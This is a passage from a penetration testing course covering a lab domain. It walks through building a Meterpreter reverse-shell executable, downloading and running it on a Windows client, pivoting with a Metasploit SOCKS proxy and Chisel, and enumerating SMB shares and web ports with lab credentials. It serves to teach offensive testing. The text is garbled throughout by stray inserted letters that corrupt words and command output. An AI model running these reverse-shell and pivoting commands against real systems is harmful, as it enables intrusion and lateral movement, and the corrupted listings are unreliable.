Since we can reuse the binary throughout the domain, we can store it in /home/kali/beyond.
kali@kali:~/beyond$ msfvenom -p windows/x64/meterpreter/reverse_tcp
LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 844
Made in Morocco
Penetration Testing with Kali Linux
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: met.exe
Listing 922 - Creating a Meterpreter reverse shell executable file
Now, let’s start a multi/handler listener with the corresponding settings in Metasploit. In addition,
we’ll set the option ExitOnSession to false. It specifies that the listener stays active for new
sessions without the need to restart it for every incoming session.
kali@kali:~/beyond$ sudo msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
y
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter_reverse_https
k
msf6 exploit(multi/handler) > set LHOST 192.168.119.5
LHOST => 192.168.119.5
s
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443 o
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false n
msf6 exploit(multi/handler) > run -j
i
[*] Exploit running as background job 0.
[*] Exploit completed, but no zsession was created.
[*] Started HTTPS reverse handler on https://192.168.119.5:443
Listing 923 - Starting Metasploit listener on port 443
D
Next, we can download and execute met.exe on CLIENTWK1.
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
PS C:\Users\marcus> .\met.exe
Listing 924 - Downloading and executing Meterpreter reverse shell
In Metasploit, a new session should appear:
[*] Meterpreter session 1 opened (192.168.119.5:443 -> 192.168.50.242:64234) at 2022-
10-11 07:05:22 -0400
Listing 925 - Incoming session in Metasploit
Once session 1 is opened, we can use multi/manage/autoroute and auxiliary/server/socks_proxy
to create a SOCKS5 proxy to access the internal network from our Kali box as we learned in the
“The Metasploit Framework” Module.
msf6 exploit(multi/handler) > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set session 1
session => 1
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 845
Made in Morocco
Penetration Testing with Kali Linux
msf6 post(multi/manage/autoroute) > run
[!] SESSION may not be compatible with this module:
[!] * incompatible session platform: windows
[*] Running module against CLIENTWK1
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.6.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
y
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 2.
Listing 926 - Creating a SOCKS5 proxy to access the internal nektwork from our Kali machine
The SOCKS5 proxy is now active and we can use proxychains to access the internal network.
s
Let’s confirm that /etc/proxychains4.conf still contains the necessary settings from previous
Modules. Meaning, only the SOCKS5 entry from the following listing should be active.
o
kali@kali:~/beyond$ cat /etc/proxychains4.conf
...
socks5 127.0.0.1 1080 n
Listing 927 - proxychains configuration file settings
Finally, we are set up to enumerate tihe network via Proxychains.
z
Let’s begin with CrackMapExec’s SMB module to retrieve basic information of the identified
servers (such as SMB settings). We’ll also provide the credentials for john to list the SMB shares
D
and their permissions with --shares. Because CrackMapExec doesn’t have an option to specify an
output file, we’ll copy the results manually and store them in a file.
kali@kali:~/beyond$ proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u
john -d beyond.com -p "dqsTwTpZPn#nL" --shares
SMB 172.16.6.240 445 DCSRV1 [*] Windows 10.0 Build 20348 x64
(name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
SMB 172.16.6.241 445 INTERNALSRV1 [*] Windows 10.0 Build 20348 x64
(name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB 172.16.6.254 445 MAILSRV1 [*] Windows 10.0 Build 20348 x64
(name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB 172.16.6.240 445 DCSRV1 [+] beyond.com\john:dqsTwTpZPn#nL
SMB 172.16.6.241 445 INTERNALSRV1 [+] beyond.com\john:dqsTwTpZPn#nL
SMB 172.16.6.240 445 DCSRV1 [+] Enumerated shares
SMB 172.16.6.240 445 DCSRV1 Share Permissions
Remark
SMB 172.16.6.240 445 DCSRV1 ----- ----------- --
----
SMB 172.16.6.240 445 DCSRV1 ADMIN$
Remote Admin
SMB 172.16.6.240 445 DCSRV1 C$
Default share
SMB 172.16.6.240 445 DCSRV1 IPC$ READ
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 846
Made in Morocco
Penetration Testing with Kali Linux
Remote IPC
SMB 172.16.6.240 445 DCSRV1 NETLOGON READ
Logon server share
SMB 172.16.6.240 445 DCSRV1 SYSVOL READ
Logon server share
SMB 172.16.6.241 445 INTERNALSRV1 [+] Enumerated shares
SMB 172.16.6.241 445 INTERNALSRV1 Share Permissions
Remark
SMB 172.16.6.241 445 INTERNALSRV1 ----- ----------- --
----
SMB 172.16.6.241 445 INTERNALSRV1 ADMIN$
Remote Admin
SMB 172.16.6.241 445 INTERNALSRV1 C$
Default share
SMB 172.16.6.241 445 INTERNALSRV1 IPC$ READ
Remote IPC y
SMB 172.16.6.254 445 MAILSRV1 [+] beyond.com\john:dqsTwTpZPn#nL
SMB 172.16.6.254 445 MAILSRV1 [+] Enumerated shares
SMB 172.16.6.254 445 MAILSRV1 Sharke Permissions
Remark
SMB 172.16.6.254 445 MAILSRV1 ----- ----------- --
s
----
SMB 172.16.6.254 445 MAILSRV1 ADMIN$
Remote Admin o
SMB 172.16.6.254 445 MAILSRV1 C$
Default share
SMB 172.16.6.254 445 MAILnSRV1 IPC$ READ
Remote IPC
Listing 928 - Enumerating SMB with CrackMapExec and proxychains
i
Listing 928 shows that john doezsn’t have actionable or interesting permissions on any of the
discovered shares. As we already established via a pre-built BloodHound query and now through
the scan, john as a normal domain user doesn’t have local Administrator privileges on any of the
D
machines in the domain.
CrackMapExec version 5.4.0 may throw the error The NETBIOS connection with
the remote host is timed out for DCSRV1, or doesn’t provide any output at all.
Version 5.4.1 contains a fix to address this issue.1203
The output also states that MAILSRV1 and INTERNALSRV1 have SMB signing set to False.
Without this security mechanism enabled, we can potentially perform relay attacks if we can
force an authentication request.
Next, let’s use Nmap to perform a port scan on ports commonly used by web applications and
FTP servers targeting MAILSRV1, DCSRV1, and INTERNALSRV1. We have to specify -sT to
perform a TCP connect scan. Otherwise, Nmap will not work over Proxychains.
kali@kali:~/beyond$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443
172.16.6.240 172.16.6.241 172.16.6.254
1203 (Porchetta Industries Wiki, 2023), https://wiki.porchetta.industries/getting-started/installation/installation-on-unix
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 847
Made in Morocco
Penetration Testing with Kali Linux
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 07:17 EDT
Nmap scan report for 172.16.6.240
Host is up (2.2s latency).
PORT STATE SERVICE
21/tcp closed ftp
80/tcp closed http
443/tcp closed https
Nmap scan report for internalsrv1.beyond.com (172.16.6.241)
Host is up (0.21s latency).
PORT STATE SERVICE
21/tcp closed ftp
80/tcp open http
443/tcp open https y
Nmap scan report for 172.16.6.254
Host is up (0.20s latency). k
PORT STATE SERVICE
s
21/tcp closed ftp
80/tcp open http
443/tcp closed https o
Nmap done: 3 IP addresses (3 hosts up) scanned in 14.34 seconds
Listing 929 - Using Nmap to pnerform a port scan on ports 21, 80, and 443
Listing 929 shows that Nmap identified the open ports 80 and 443 on 172.16.6.241
(INTERNALSRV1) and port 80 on 17i2.16.6.254 (MAILSRV1). For now, we can skip the latter one
as it’s most likely the same web pzage and service we enumerated from an external perspective.
While we could use the SOCKS5 proxy and proxychains to browse to the open port on
D
172.16.6.241, we’ll use Chisel1204 as it provides a more stable and interactive browser session.
From the releases page,1205 we download the Windows and Linux amd64 versions and extract the
binaries in /home/kali/beyond/.
On our Kali machine, we’ll use Chisel in server mode to receive incoming connections on port
8080. In addition, we’ll add the –reverse option to allow reverse port forwarding.
kali@kali:~/beyond$ chmod a+x chisel
kali@kali:~/beyond$ ./chisel server -p 8080 --reverse
2022/10/11 07:20:46 server: Reverse tunnelling enabled
2022/10/11 07:20:46 server: Fingerprint UR6ly2hYyr8iefMfm+gK5mG1R06nTKJF0HV+2bAws6E=
2022/10/11 07:20:46 server: Listening on http://0.0.0.0:8080
Listing 930 - Setting up Chisel on Kali to access the Web Server on INTERNALSRV1 via Browser
Then, we’ll transfer the extracted chisel.exe binary to CLIENTWK1 by using Meterpreter’s upload
command.
1204 (Github, 2023), https://github.com/jpillora/chisel
1205 (Github, 2022), https://github.com/jpillora/chisel/releases/tag/v1.7.7
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 848
Made in Morocco
Penetration Testing with Kali Linux
msf6 auxiliary(server/socks_proxy) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > upload chisel.exe C:\\Users\\marcus\\chisel.exe
[*] Uploading : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
[*] Uploaded 7.85 MiB of 7.85 MiB (100.0%): /home/kali/beyond/chisel.exe ->
C:\Users\marcus\chisel.exe
[*] Completed : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
Listing 931 - Uploading Chisel to CLIENTWK1 via our Meterpreter session
Now, we can enter shell and utilize Chisel in client mode to connect back to our Kali machine on
port 8080. We’ll create a reverse port forward with the syntax R:localport:remotehost:remoteport.
In our case, the remote host and port are 172.16.6.241 and 80. The local port we want to utilize is
80.
y
C:\Users\marcus> chisel.exe client 192.168.119.5:8080
R:80:172.16.6.241:80
k
2022/10/11 07:22:46 client: Connecting to ws://192.168.119.5:8080
2022/10/11 07:22:46 client: Connected (Latency 11.0449ms)
s
Listing 932 - Utilizing Chisel to set up a reverse port forwarding to port 80 on INTERNALSRV1
Once Chisel connects, we can browse to port 80 oon 172.16.6.241 via port 80 on our Kali machine
(127.0.0.1) by using Firefox:
n
i
z
D
Figure 301: WordPress page on INTERNALSRV1 (172.16.6.241)
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 849
Made in Morocco
Penetration Testing with Kali Linux
Figure 301 shows us a WordPress instance (indicated by the URL and title of the page) on
INTERNALSRV1. Let’s browse to the dashboard login page for WordPress at
http://127.0.0.1/wordpress/wp-admin and try to log into it with credentials we’ve discovered so
far.
Once we have entered the URL, Firefox displays an error:
y
k
s
Figure 302: Failed Redirect too the Administrator Login
The navigation bar in Firefox shows that we were redirected to internalsrv1.beyond.com. We can
assume that the WordPress instance has nthe DNS name set as this address instead of the IP
address. Because our machine doesn’t have information about this DNS name, we cannot
connect to the page.
i
To be able to fully use the web zapplication, we’ll add internalsrv1.beyond.com via 127.0.0.1 to
/etc/hosts.
D
kali@kali:~/beyond$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 kali
...
127.0.0.1 internalsrv1.beyond.com
...
Listing 933 - Contents of /etc/hosts
Now, let’s open the /wp-admin page again.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 850
Made in Morocco
Penetration Testing with Kali Linux
y
k
Figure 303: Administrator Login of Wordpress on INTERNALSRV1
s
Figure 303 shows that the login page is now displayed correctly.
Let’s try to log in with the credentials we’ve obtaoined so far as well as common username and
password pairs, such as admin:admin. Unfortunately, none of them work.
Let’s summarize the information we’ve ganthered in this section before we attempt our attacks.
First, we enumerated all active sessions. Interestingly, the domain administrator beccy has an
active session on MAILSRV1. Next, we identified daniela as a kerberoastable user due to the
i
http/internalsrv1.beyond.com SPN.
z
Then, we set up a SOCKS5 proxy with Metasploit and used CrackMapExec and Nmap to perform
network enumeration. TheD output revealed that MAILSRV1 and INTERNALSRV1 each have an
accessible web server and SMB signing disabled. Via Chisel, we were able to browse to the
WordPress instance on INTERNALSRV1. However, none of the credentials worked to log in to the
WordPress login page.
24.5 Attacking an Internal Web Application
This Learning Unit covers the following Learning Objectives:
• Perform Kerberoasting
• Abuse a WordPress Plugin function for a Relay attack
In the previous Learning Unit, we obtained a huge amount of information and data regarding the
client’s domain network. In this Learning Unit, we’ll combine various pieces of gathered
information to create an attack vector.
24.5.1 Speak Kerberoast and Enter
Based on the information from the previous Learning Unit, the web application on
INTERNALSRV1 is the most promising target at the moment. Because it is a WordPress site, we
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 851
Made in Morocco
Penetration Testing with Kali Linux
could use WPScan again or use password attacks to successfully log in to WordPress’s
dashboard.
Every time we obtain new information, we should reevaluate what we already know. For our
situation, this means that we already obtained the information that daniela has an http SPN